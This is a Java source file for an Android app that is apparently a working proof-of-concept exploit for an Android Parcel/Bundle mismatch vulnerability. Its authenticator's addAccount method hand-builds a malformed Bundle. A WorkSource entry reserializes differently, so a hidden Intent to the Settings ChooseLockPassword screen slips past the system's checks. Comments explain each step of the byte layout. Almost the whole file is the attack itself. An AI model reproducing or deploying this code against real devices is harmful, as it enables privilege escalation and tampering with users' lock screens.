package com.example.badparcel;

import android.accounts.AbstractAccountAuthenticator;
import android.accounts.Account;
import android.accounts.AccountAuthenticatorResponse;
import android.accounts.NetworkErrorException;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;

public class MyAuthenticator extends AbstractAccountAuthenticator {

    public MyAuthenticator(Context context) {
        super(context);
    }

    @Override
    public Bundle editProperties(AccountAuthenticatorResponse accountAuthenticatorResponse, String s) {
        return null;
    }

    @Override
    public Bundle addAccount(AccountAuthenticatorResponse accountAuthenticatorResponse, String s, String s1, String[] strings, Bundle options) throws NetworkErrorException {
        final String TAG = "FadeMode";

        Bundle bundle = new Bundle();
        Parcel parcelFakeBundleContainer = Parcel.obtain();
        Parcel fakeBundleKeyPairs = Parcel.obtain();
        Parcel obtain3 = Parcel.obtain();
        //bundle kv pair format is as follows
        // Key String16 length n*2 bytes, align of 4 byte, end with 0x0000
        // Key Utf16 string
        // Key end and padding
        // Value type
        // Value
        // [Value end]? and padding if needed
        // repeat for each key/value pair
        fakeBundleKeyPairs.writeInt(3); //Bundle has 3 key/value pairs
        //item1
        //item1 Strint16
        fakeBundleKeyPairs.writeInt(13); //  string len 2*13=26 bytes
        // 4*6 bytes + 2 bytes string content encoding in utf16 2bytes for a char
        fakeBundleKeyPairs.writeInt(2);// the invisible char array result in a "" string in unparcel
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(6);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0); // end and padding
        fakeBundleKeyPairs.writeInt(4); //value type VAL_PARCELABLE
        //start of parcelable value
        fakeBundleKeyPairs.writeString("android.os.WorkSource");
        // content of WorkSource
        /*
    WorkSource(Parcel in) {
        mNum = in.readInt();
        mUids = in.createIntArray();
        mNames = in.createStringArray();
        int numChains = in.readInt();
         */
        fakeBundleKeyPairs.writeInt(-1); //mNum
        fakeBundleKeyPairs.writeInt(-1); //createIntArray, N=-1,will skip
        fakeBundleKeyPairs.writeInt(-1); // createStringArray, N=-1,will skip
        fakeBundleKeyPairs.writeInt(1); //numChains=1  //in second pass, the position is 104
        // the magic is here, we claim the chain has one item, but we passed an empty arraylist,
        // after unparcel, the arraylist will be empty
        // when parcel it again, the arraylist will be empty and the numChains will be 0
        fakeBundleKeyPairs.writeInt(-1); //readParcelableList, N=-1,will skip
        //after parceled, unparcel, above will be the start of the item2, the String16 key
        //which has a 4bytes size,followed by the key string in utf16
        // in this case, length is -1, and we still will read the end of the key string,2bytes
        // and the padding of 2btes, so total 8bytes
        //end of WrokSource
        //item2
        // item2 key string16, length =13
        fakeBundleKeyPairs.writeInt(13);
        //after parceled, unparcel, above will be skiped as the end of the string,
        // since we are not checking the padding values, 13 happened to be a valid padding value

        //begin of the string
        fakeBundleKeyPairs.writeInt(13);
        //after parceled, unparcel, above will be the value type field, 13 is type VAL_BYTEARRAY
        fakeBundleKeyPairs.writeInt(68);
        //after parceled, unparcel, above become the byte length of the array
        //this is the critical part, it allow attacker to bypass the previous harmless item3 and
        //point the item3 to our payload item4(whihc is not readed by the first time)
        fakeBundleKeyPairs.writeInt(11);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(7);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);//string end and padding
        fakeBundleKeyPairs.writeInt(1);//type VAL_INTEGER = 1;
        fakeBundleKeyPairs.writeInt(1); //value
        //item3
        //item3 key string16, length =13
        fakeBundleKeyPairs.writeInt(13);

        fakeBundleKeyPairs.writeInt(22);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0);
        fakeBundleKeyPairs.writeInt(0); //string end and padding
        fakeBundleKeyPairs.writeInt(13); //type VAL_BYTEARRAY
        fakeBundleKeyPairs.writeInt(-1); // length = -1, will skip
        //after parceled, unparcel, above become the end of item2,offset 68bytes
        int fakeBundleKV_item3_end_pos = fakeBundleKeyPairs.dataPosition();
        //I suppose it is still following the above format
        fakeBundleKeyPairs.writeString("intent"); //key
        fakeBundleKeyPairs.writeInt(4); //value type VAL_PARCELABLE
        // Intent Parcelable content
        fakeBundleKeyPairs.writeString("android.content.Intent"); //Action class
        //right now obtain3 is empty
        Intent intent = new Intent();
        intent.setComponent(new ComponentName("com.android.settings",
                "com.android.settings.password.ChooseLockPassword"));
        intent.writeToParcel(obtain3, 0); // a lot of empty fields  and one component field written into obtain3
        fakeBundleKeyPairs.appendFrom(obtain3, 0, obtain3.dataSize());
        int fakeBundleKVAfterAppendIntentPos = fakeBundleKeyPairs.dataPosition();
        fakeBundleKeyPairs.setDataPosition(fakeBundleKV_item3_end_pos - 4);//the item3 bytearray length field position
        //write the fake intent length
        fakeBundleKeyPairs.writeInt(fakeBundleKVAfterAppendIntentPos - fakeBundleKV_item3_end_pos);
        //so after that, the fake intent is stored in the Bundle's item3 in "bytearray" format(actually not)
        //reset the position to the current end position
        fakeBundleKeyPairs.setDataPosition(fakeBundleKVAfterAppendIntentPos);
        int dataSize = fakeBundleKeyPairs.dataSize();
        Log.d(TAG, "length is " + Integer.toHexString(dataSize));
        //now we know the bundle size
        //write the bundle size to the parcel1
        //the bundle format is as follows
        // bundle length 4 bytes
        // magic header 4 bytes
        // key/value pairs
        parcelFakeBundleContainer.writeInt(dataSize);
        parcelFakeBundleContainer.writeInt(0x4c444E42); //Bundle Magic Header
        parcelFakeBundleContainer.appendFrom(fakeBundleKeyPairs, 0, dataSize);
        parcelFakeBundleContainer.setDataPosition(0);
        //use a real bundle to copy the content from the fake bundle
        bundle.readFromParcel(parcelFakeBundleContainer);
        Log.d(TAG, bundle.toString());
        return bundle;
    }

    @Override
    public Bundle confirmCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle getAuthToken(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public String getAuthTokenLabel(String s) {
        return null;
    }

    @Override
    public Bundle updateCredentials(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String s, Bundle bundle) throws NetworkErrorException {
        return null;
    }

    @Override
    public Bundle hasFeatures(AccountAuthenticatorResponse accountAuthenticatorResponse, Account account, String[] strings) throws NetworkErrorException {
        return null;
    }
}
